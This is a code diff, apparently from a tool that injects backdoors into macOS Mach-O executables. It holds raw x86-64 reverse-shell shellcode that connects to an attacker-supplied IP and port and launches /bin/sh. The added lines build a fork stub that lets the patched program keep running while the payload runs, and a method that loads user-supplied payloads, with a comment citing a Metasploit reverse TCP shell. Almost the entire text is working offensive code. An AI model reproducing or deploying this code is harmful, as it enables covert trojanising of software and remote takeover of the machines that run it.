@@ -72,7 +72,7 @@ class macho_intel64_shellcode():
                            "\x00\x02"
                            )
 
-        self.shellcode2 += struct.pack(">h", self.PORT) 
+        self.shellcode2 += struct.pack(">h", self.PORT)
         self.shellcode2 += self.pack_ip_addresses()
         self.shellcode2 += ("\x56\x48\x89\xe6\x6a\x10\x5a\x0f"
                             "\x05\x4c\x89\xe7\xb8\x5a\x00\x00\x02\x48\x31\xf6\x0f\x05\xb8\x5a"
@@ -80,6 +80,27 @@ class macho_intel64_shellcode():
                             "\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x8b\x3c"
                             "\x24\x48\x31\xd2\x52\x57\x48\x89\xe6\x0f\x05"
                             )
+
+        self.shellcode1 = ("\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2")  # FORK()
+        self.shellcode1 += "\x0f\x84"   # \x4c\x03\x00\x00"  # <-- Points to LC_MAIN/LC_UNIXTREADS offset
+        if self.jumpLocation < 0:
+            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
+        else:
+            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)
+
+        self.shellcode = self.shellcode1 + self.shellcode2
+
+        return (self.shellcode1 + self.shellcode2)
+
+    def user_supplied_shellcode(self):
+        if self.SUPPLIED_SHELLCODE is None:
+            print "[!] User must provide shellcode for this module (-U)"
+            return False
+        else:
+            supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()
+
+        #From metasploit LHOST=127.0.0.1 LPORT=8080 Reverse Tcp
+        self.shellcode2 = supplied_shellcode
 
         self.shellcode1 = ("\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2")  # FORK()
         self.shellcode1 += "\x0f\x84"   # \x4c\x03\x00\x00"  # <-- Points to LC_MAIN/LC_UNIXTREADS offset
